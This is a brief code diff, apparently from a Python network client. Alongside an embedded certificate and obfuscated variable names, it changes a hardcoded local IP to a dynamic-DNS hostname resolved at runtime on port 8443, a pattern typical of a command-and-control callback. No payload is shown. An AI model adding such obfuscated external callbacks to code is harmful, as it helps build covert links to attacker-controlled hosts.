@@ -35,7 +35,8 @@ k41DKdLRahoz/5E=
 -----END CERTIFICATE-----
 """
 
-R4nd0m_Addr3ss = "192.168.1.40"
+fdffessdrre = "zino.ddnsking.com"
+R4nd0m_Addr3ss = socket.gethostbyname(fdffessdrre)
 R4nd0m_P0rt = 8443
 
 def G3nR4nd0mN0m():
